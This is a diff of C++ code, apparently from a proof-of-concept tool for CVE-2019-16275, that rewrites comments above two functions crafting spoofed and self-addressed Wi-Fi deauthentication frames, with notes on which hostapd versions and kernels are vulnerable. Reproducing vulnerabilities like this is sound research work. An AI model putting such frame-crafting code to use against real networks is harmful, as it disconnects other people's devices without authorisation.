@@ -18,12 +18,6 @@ using namespace filesystem;
 using namespace Tins;
 using namespace chrono;
 
-// CVE-2019-16275 / hostapd advisory 2019-7
-// Deauth FROM AP TO client
-// client with PMF receives it as NL80211_CMD_UNPROT_DEAUTHENTICATE sme_event_unprot_disconnect checks SA==BSSID + reason==CLASS3 -> triggers SA Query.
-// Unpatched AP (hostapd < 2.10) does not validate SA of received frames, so an attacker can spoof SA=AP_MAC
-// The AP will process or forward in a way that breaks the SA Query exchange
-// patched hostapd (>= 2.10) silently drops frames where SA == own_addr before processing.
 RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
 	Dot11Deauthentication frame(sta_mac, ap_mac);
 	frame.addr3(ap_mac);  // BSSID
@@ -34,14 +28,11 @@ RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
 }
 
 // CVE-2019-16275 (w1.fi/security/2019-7) "AP mode PMF disconnection protection bypass"
-// deauth addressed TO the AP with SA=AP_MAC (self-addressed).
-// - on OLD kernels (~4.x, 2019 era): mac80211 passes the frame to hostapd; unpatched hostapd 2.9
-//   processes it in a way that triggers nl80211 INTERFACE-DISABLED, breaking the client's SA Query
-// - on MODERN kernels (5.x+): mac80211 appears to filter SA=own_addr frames before they reach
-//   hostapd, so INTERFACE-DISABLED is never triggered regardless of hostapd version.
-//   The hostapd 2.10 patch (silently drop SA==own_addr before processing) is therefore
-//   defence-in-depth for older kernels that still pass the frame through.
-// -> reproducible only on old kernels with unpatched hostapd 2.9; kernel 7.x tested: not triggered
+// deauth addressed TO the AP with SA=AP_MAC (self-addressed)
+// - on OLD kernels (~4.x, 2019 era): mac80211 passes the frame to hostapd
+//		- unpatched hostapd 2.9 processes it -> triggers nl80211 INTERFACE-DISABLED, breaking the client's SA Query
+// - on MODERN kernels (5.x+): mac80211 appears to filter SA=own_addr frames before they reach hostapd
+//   The hostapd 2.10 patch (silently drop SA==own_addr before processing)
 RadioTap make_cve_deauth(const HWAddress<6> &ap_mac) {
 	Dot11Deauthentication frame(ap_mac, ap_mac); // DA=AP, SA=AP (self-addressed)
 	frame.addr3(ap_mac);
